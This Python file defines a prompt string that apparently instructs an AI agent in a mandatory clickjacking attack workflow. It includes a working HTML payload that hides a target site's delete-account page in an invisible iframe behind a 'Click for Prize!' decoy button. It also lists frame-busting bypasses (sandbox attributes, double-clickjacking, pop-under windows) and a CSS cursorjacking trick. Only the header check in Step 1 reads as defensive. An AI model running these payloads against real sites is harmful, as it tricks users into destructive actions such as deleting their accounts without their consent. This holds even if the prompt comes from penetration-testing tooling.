"""
Clickjacking Attack Skill Prompt.
"""
CLICKJACKING_SKILL_PROMPT = """
## ATTACK SKILL: CLICKJACKING

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Check for frame-busting headers: `X-Frame-Options: DENY` or `SAMEORIGIN`, `Content-Security-Policy: frame-ancestors 'none'`

#### STEP 2: BASIC CLICKJACKING
```html
<html><body>
<iframe src="https://TARGET/delete-account" width="500" height="500" style="opacity:0; position:absolute; top:100px; left:100px;"></iframe>
<button style="position:absolute; top:200px; left:200px;">Click for Prize!</button>
</body></html>
```
→ Victim clicks "Prize" but actually clicks "Delete Account" behind the invisible iframe.

#### STEP 3: FRAME-BUSTING BYPASS
- `sandbox="allow-forms allow-scripts"` attribute on iframe
- Double-clickjacking: overlay two layers
- `window.open()` with pop-under window

#### STEP 4: CURSORJACKING
```css
#target { cursor: url('fake-cursor.png'), auto; }
```
→ Display fake cursor, real cursor clicks something else.

#### ANTI-PATTERNS: Check headers first. If X-Frame-Options is missing, clickjacking is viable immediately.
"""
